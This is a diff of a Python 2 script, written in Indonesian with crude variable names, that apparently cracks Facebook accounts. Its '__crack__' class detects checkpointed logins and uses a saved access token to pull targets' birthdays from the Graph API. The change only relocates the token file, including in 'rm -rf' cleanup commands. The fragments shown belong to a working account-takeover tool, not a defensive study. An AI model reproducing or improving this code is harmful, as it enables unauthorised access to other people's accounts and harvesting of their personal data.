@@ -139,7 +139,7 @@ def yayanxd():
         wuhan(kontol)
         print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N);time.sleep(2)
         print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N);time.sleep(2)
-        open('.memek.txt', 'w').write(kontol)
+        open('.ppk/.memek.txt', 'w').write(kontol)
         raw_input(' %s*%s tekan enter '%(O,N))
         os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
         moch_yayan()
@@ -151,7 +151,7 @@ def yayanxd():
 def moch_yayan():
     os.system('clear')
     try:
-    	kontol = open('.memek.txt', 'r').read()
+    	kontol = open('.ppk/.memek.txt', 'r').read()
     except (IOError):
         print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
     try:
@@ -159,7 +159,7 @@ def moch_yayan():
         get = json.loads(req.text)
         nama = get['name']
     except (IOError):
-        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt');yayanxd()
     except requests.exceptions.ConnectionError:
         exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
     os.system('clear')
@@ -230,7 +230,7 @@ def moch_yayan():
     elif pepek in['0','00']:
         print '\n'
         tod()
-        time.sleep(1);os.system('rm -rf .memek.txt')
+        time.sleep(1);os.system('rm -rf .ppk/.memek.txt')
         jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
     else:
         print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
@@ -694,7 +694,7 @@ class __crack__:
                 continue
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
-                    kontol = open('.memek.txt').read()
+                    kontol = open('.ppk/.memek.txt').read()
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
                     az = json.loads(ak.text)
                     graph = az["birthday"]
@@ -748,7 +748,7 @@ class __crack__:
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
-                    kontol = open('.memek.txt').read()
+                    kontol = open('.ppk/.memek.txt').read()
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
                     az = json.loads(ak.text)
                     graph = az["birthday"]
@@ -802,7 +802,7 @@ class __crack__:
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
-                    kontol = open('.memek.txt').read()
+                    kontol = open('.ppk/.memek.txt').read()
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
                     az = json.loads(ak.text)
                     graph = az["birthday"]
